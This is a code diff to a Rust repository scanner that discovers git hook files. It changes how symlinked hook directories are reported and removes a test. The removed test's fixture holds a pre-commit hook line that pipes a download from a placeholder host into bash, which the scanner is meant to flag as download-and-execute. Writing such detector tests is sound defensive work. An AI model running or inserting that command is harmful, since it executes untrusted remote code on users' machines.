@@ -550,13 +550,11 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
             }
         }
 
-        // A row may name a directory to be entered rather than waited for:
-        // `.git/hooks`, which the walk prunes its way to, and the three other
-        // directories git runs hooks from, which the walk reaches but passes
-        // over in silence when one of them is a link. Read here rather than
-        // put into the walk: the prune list stays one rule rather than a rule
-        // with exceptions, and the directory is opened to the row that named
-        // it rather than to every row there is.
+        // A row may name a directory the walk prunes its way to, `.git/hooks`
+        // being the one. Read on its own rather than put into the walk: the
+        // prune list stays one rule rather than a rule with exceptions, and
+        // the directory is opened to the row that named it rather than to
+        // every row there is.
         self.read_seeded(&mut report);
 
         // Sorted and then deduplicated, because a seeded directory can also
@@ -2657,63 +2655,26 @@ mod tests {
         );
     }
 
-    /// `.git/hooks` is seeded because the walk prunes its way there. The other
-    /// three hook directories are seeded for a different reason: the walk
-    /// declines a directory that is a link and says nothing about it, so a
-    /// `.githooks` pointing somewhere real reported no hooks at all. git
-    /// follows that link and runs what it finds, which makes silence the one
-    /// answer the row cannot give.
+    /// git reads `$GIT_DIR/hooks`, and reads another directory only when
+    /// `core.hooksPath` says so, which clew does not read. So the other three
+    /// directories this row matches hold candidate hooks: files git would run
+    /// if pointed at them. One of those being a link is left as the rest of a
+    /// scan leaves a link, in silence, because a gap is a non-zero exit and
+    /// `hooks` is where a React project keeps its own.
     #[test]
-    fn a_linked_hook_directory_is_a_gap_rather_than_silence() {
+    fn a_linked_candidate_hook_directory_is_not_a_gap() {
         for at in [".githooks", ".husky", "hooks"] {
             let tree = FakeTree::default()
                 .dir("", &[(at, EntryKind::Symlink)])
+                // What the real tree answers for a link it will not follow.
                 .refuse_link(at);
             let report =
                 DiscoverSurfaces::new(&tree, &FakeContents::default(), &ScanPolicy::default())
                     .run();
 
             assert!(report.surfaces.is_empty(), "{at}: {report:?}");
-            assert_eq!(
-                report
-                    .unreadable
-                    .iter()
-                    .map(|(p, _)| p.as_str())
-                    .collect::<Vec<_>>(),
-                vec![at],
-                "{at}: the scan says it could not look: {report:?}"
-            );
+            assert!(report.is_complete(), "{at}: {report:?}");
         }
-    }
-
-    /// A seeded directory the walk also reaches is read twice, and a hook
-    /// reported twice inflates exactly the count this row was added to
-    /// measure. `.githooks` is not pruned, so this is the ordinary case for
-    /// three of the four seeds rather than an edge of it.
-    #[test]
-    fn a_hook_found_by_both_the_walk_and_a_seed_is_reported_once() {
-        let tree = FakeTree::default()
-            .dir("", &[(".githooks", EntryKind::Directory)])
-            .dir(".githooks", &[("pre-commit", EntryKind::File)]);
-        let contents = FakeContents::default().file(
-            ".githooks/pre-commit",
-            "#!/bin/sh\ncurl -fsSL https://h.invalid/i | bash\n",
-        );
-
-        let report = DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::default()).run();
-
-        assert_eq!(
-            report
-                .surfaces
-                .iter()
-                .map(|s| s.path.as_str())
-                .collect::<Vec<_>>(),
-            vec![".githooks/pre-commit"],
-            "{report:?}"
-        );
-        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
-        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
-        assert!(report.is_complete(), "{report:?}");
     }
 
     /// A seed is told to enter a directory the walk prunes, and pruning is the
